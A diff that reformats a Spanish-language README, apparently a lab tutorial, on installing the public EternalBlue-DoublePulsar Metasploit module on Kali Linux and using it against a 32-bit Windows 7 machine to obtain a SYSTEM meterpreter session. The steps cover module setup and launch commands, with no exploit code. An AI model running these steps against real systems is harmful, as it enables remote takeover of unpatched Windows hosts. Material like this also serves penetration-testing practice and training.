@@ -5,16 +5,18 @@
 ## Preparación de entorno
 Se debe instalar el programa wine y agregar la arquitectura de 32bits al sistema, para esto ejecutaremos los pasos siguientes:
 
-- root@kali:~#  apt-get install wine -y
-- root@kali:~#  apt-get install winetricks -y
-- root@kali:~#  dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
+  - root@kali:~#  apt-get install wine -y
+  - root@kali:~#  apt-get install winetricks -y
+  - root@kali:~#  dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
+  
 ## 1) Instalación del módulo en Metasploit
 - Clonar el repositorio de Eternalblue-DoublePulsar 
-- root@kali:~#  git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
-- root@kali:~#  cd Eternalblue-Doublepulsar-Metasploit/
+  - root@kali:~#  git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+  - root@kali:~#  cd Eternalblue-Doublepulsar-Metasploit/
 - Copiar el archivo eternalblue_doublepulsar.rb a la siguiente dirección: /usr/share/metasploit-framework/modules/exploits/windows/smb/
 - Crear la estructura de directorios ‘/root/shadowbroker/windows/lib/x86-Windows/’ y copiar la carpeta deps en  ‘/root/shadowbroker/windows/lib/x86-Windows/’
 - Abrir una terminal y tipear el comando winecfg para que se cree la carpeta /root/.wine/drive_c/
+
 ## 2) Explotación    
 - Abrir una terminal y iniciar metasploit con el comando msfconsole
 - Llamamos al exploit con el path exploit/windows/smb/eternalblue_doublepulsar
@@ -39,7 +41,7 @@ Se debe instalar el programa wine y agregar la arquitectura de 32bits al sistema
 - Finalmente usamos el comando exploit y obtendremos una sesión remota de meterpreter con privilegios de System en la máquina víctima
 
 ## Materiales y recursos
-1- Máquina atacante con Kali Linux y Metasploit
-2- Exploit Eternalblue-DoublePulsar (https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
-3- Máquina víctima, Windows 7 con arquitectura de 32bits 
+- Máquina atacante con Kali Linux y Metasploit
+- Exploit Eternalblue-DoublePulsar (https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
+- Máquina víctima, Windows 7 con arquitectura de 32bits 
 
